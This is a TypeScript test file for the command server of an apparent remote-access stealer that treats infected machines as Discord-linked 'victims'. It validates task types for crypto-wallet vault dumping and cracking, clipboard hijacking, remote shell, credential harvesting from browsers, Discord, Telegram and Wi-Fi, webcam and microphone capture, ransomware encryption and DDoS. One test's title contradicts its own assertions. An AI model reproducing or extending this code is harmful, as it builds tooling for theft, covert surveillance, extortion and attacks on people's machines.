import { test } from 'node:test';
import assert from 'node:assert/strict';
import { taskLinkError } from '../server/lib/tasks';
import { transportOf, validateParams } from '../server/lib/task-schemas';
import { capabilityMissing } from '../server/lib/agent-contract';

const victim = (id: string, channelId?: string, missing = false) => ({
  id,
  hostname: `host-${id}`,
  discord: channelId ? { channelId, missingAt: missing ? new Date() : null } : null
});

test('a live link dispatches', () => {
  assert.equal(taskLinkError([victim('a', '111')], new Set()), null);
});

test('a victim without a link is rejected', () => {
  const error = taskLinkError([victim('a')], new Set());
  assert.equal(error?.code, 'discord_unlinked');
  assert.deepEqual(error?.victim_ids, ['a']);
});

test('an ignored channel is treated as unlinked even if the link row exists', () => {
  const error = taskLinkError([victim('a', '111')], new Set(['111']));
  assert.equal(error?.code, 'discord_unlinked');
});

test('a missing channel needs a recreate or re-link', () => {
  const error = taskLinkError([victim('a', '111', true)], new Set());
  assert.equal(error?.code, 'discord_channel_missing');
});

test('unlinked wins over missing when both are present', () => {
  const error = taskLinkError([victim('a', '111', true), victim('b')], new Set(['111']));
  assert.equal(error?.code, 'discord_unlinked');
  assert.deepEqual(error?.victim_ids, ['a', 'b']);
});

test('the seventeen task types validate at the edge', () => {
  const samples: Record<string, Record<string, unknown>> = {
    scan_wallets: {},
    dump_vault: { target: 'metamask' },
    crack_vault: { target: 'metamask' },
    clip_start: {},
    clip_stop: {},
    shell: { command: 'whoami' },
    harvest: {},
    screenshot: {},
    file_pull: { path: '/tmp/a' },
    cancel: { task_id: '9b2f1a34-5c6d-4e7f-8a90-1b2c3d4e5f60' },
    agent: { command: 'ping' },
    monitor: { seconds: 5, fps: 1, quality: 60 },
    files: { action: 'list', path: '/tmp' },
    webcam: {},
    mic: { seconds: 5 },
    ransomware: { action: 'encrypt', path: '/tmp/x' },
    ddos: { method: 'http', host: 'example.com', port: 80 }
  };
  assert.equal(Object.keys(samples).length, 17);
  for (const [name, params] of Object.entries(samples)) {
    assert.equal(validateParams(name, params), null, name);
    assert.ok(transportOf(name) === 'http' || transportOf(name) === 'frame', name);
  }
});

test('new tasks reject wrong enums and missing required params', () => {
  assert.equal(validateParams('harvest', { kind: 'productkey' }), null);
  assert.equal(validateParams('harvest', { kind: 'nope' }), 'invalid_param: kind (all|browsers|discord|telegram|wifi|productkey)');
  assert.equal(validateParams('files', { action: 'list' }), 'missing_param: path');
  assert.equal(validateParams('files', { action: 'chmod', path: '/tmp' }), 'invalid_param: action (list|upload|mkdir|rename|delete|compress)');
  assert.equal(validateParams('ddos', { method: 'udp', host: 'x', port: 1 }), 'invalid_param: method (http|tcp)');
  assert.equal(validateParams('monitor', { fps: 0.1 }), 'invalid_param: fps (0.2..5)');
  assert.equal(validateParams('ransomware', { action: 'encrypt', path: '/tmp' }), null);
  assert.equal(transportOf('monitor'), 'http');
  assert.equal(transportOf('webcam'), 'http');
});

test('max_bytes outside 1 MiB..512 MiB is rejected', () => {
  assert.equal(validateParams('scan_wallets', { max_bytes: 1_048_576 }), null);
  assert.equal(validateParams('scan_wallets', { max_bytes: 536_870_912 }), null);
  assert.equal(validateParams('scan_wallets', { max_bytes: 1_048_575 }), 'invalid_param: max_bytes (1048576..536870912)');
  assert.equal(validateParams('scan_wallets', { max_bytes: 536_870_913 }), 'invalid_param: max_bytes (1048576..536870912)');
});

test('http_only names carry the http transport', () => {
  for (const name of ['scan_wallets', 'dump_vault', 'crack_vault', 'shell', 'agent']) {
    assert.equal(transportOf(name), 'http');
  }
  for (const name of ['clip_start', 'clip_stop', 'harvest', 'screenshot', 'file_pull', 'cancel']) {
    assert.equal(transportOf(name), 'frame');
  }
});


test('capability gates never reject agents that declare nothing', () => {
  assert.equal(capabilityMissing([], 'input:mouse'), 'input');
  assert.equal(capabilityMissing(undefined, 'webcam:stream'), 'media');
  assert.equal(capabilityMissing(['media'], 'input:mouse'), 'input');
  assert.equal(capabilityMissing(['input'], 'input:mouse'), null);
  assert.equal(capabilityMissing(['input'], 'webcam:snapshot'), 'media');
});
